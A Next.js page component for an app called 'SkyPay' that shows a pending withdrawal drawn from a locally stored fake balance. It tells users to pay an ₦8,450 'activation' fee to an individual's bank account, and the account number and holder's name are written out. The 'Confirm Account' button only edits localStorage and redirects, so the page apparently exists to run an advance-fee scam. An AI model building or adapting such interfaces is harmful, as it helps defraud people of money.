"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import Image from "next/image"

export default function ActivatePage() {
  const router = useRouter()
  const [withdrawalData, setWithdrawalData] = useState<any>(null)

  useEffect(() => {
    const pendingWithdrawal = localStorage.getItem("pendingWithdrawal")
    if (pendingWithdrawal) {
      setWithdrawalData(JSON.parse(pendingWithdrawal))
    }
  }, [])

  const formatAmount = (amount: number) => {
    return new Intl.NumberFormat("en-NG", {
      style: "currency",
      currency: "NGN",
      minimumFractionDigits: 0,
    }).format(amount)
  }

  const handleConfirm = () => {
    if (withdrawalData) {
      // Deduct from balance
      const currentBalance = Number.parseFloat(localStorage.getItem("balance") || "300000")
      const newBalance = currentBalance - withdrawalData.amount
      localStorage.setItem("balance", newBalance.toString())

      // Clear pending withdrawal
      localStorage.removeItem("pendingWithdrawal")

      // Navigate to payment confirmed page
      router.push("/payment-confirmed")
    }
  }

  if (!withdrawalData) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <p>Loading...</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-white p-6">
      <div className="max-w-md mx-auto space-y-6">
        <div className="flex justify-center mb-6">
          <Image src="/skypay-logo.png" alt="SkyPay" width={120} height={48} className="object-contain" />
        </div>

        <h1 className="text-3xl font-bold">Activate Account</h1>

        <div className="space-y-4">
          <p className="text-gray-300 text-center leading-relaxed">
            You have a pending withdrawal of {formatAmount(withdrawalData.amount)} which was on
          </p>

          <p className="text-gray-300 text-center leading-relaxed mt-8">
            Your payment will be approved upon activation. to activate, pay the sum of ₦8,450 to the account below and
            click confirm account
          </p>

          <div className="bg-zinc-900 border border-yellow-500/30 rounded-3xl overflow-hidden mt-6">
            <div className="grid divide-y divide-yellow-500/30">
              <div className="flex justify-between items-center p-4">
                <span className="text-gray-400">Amount</span>
                <span className="font-semibold text-lg text-yellow-500">₦8,450</span>
              </div>
              <div className="flex justify-between items-center p-4">
                <span className="text-gray-400">Account Number</span>
                <span className="font-semibold text-lg">9136574323</span>
              </div>
              <div className="flex justify-between items-center p-4">
                <span className="text-gray-400">Account Name</span>
                <span className="font-semibold text-lg">Isamaila Ayo</span>
              </div>
              <div className="flex justify-between items-center p-4">
                <span className="text-gray-400">Bank Name</span>
                <span className="font-semibold text-lg">Momo PSB</span>
              </div>
            </div>
          </div>
        </div>

        <Button
          onClick={handleConfirm}
          size="lg"
          className="w-full h-14 text-lg font-semibold bg-yellow-500 hover:bg-yellow-400 text-black rounded-2xl shadow-lg shadow-yellow-500/20 transition-all duration-300 hover:shadow-xl hover:shadow-yellow-500/30 mt-8"
        >
          Confirm Account
        </Button>
      </div>
    </div>
  )
}
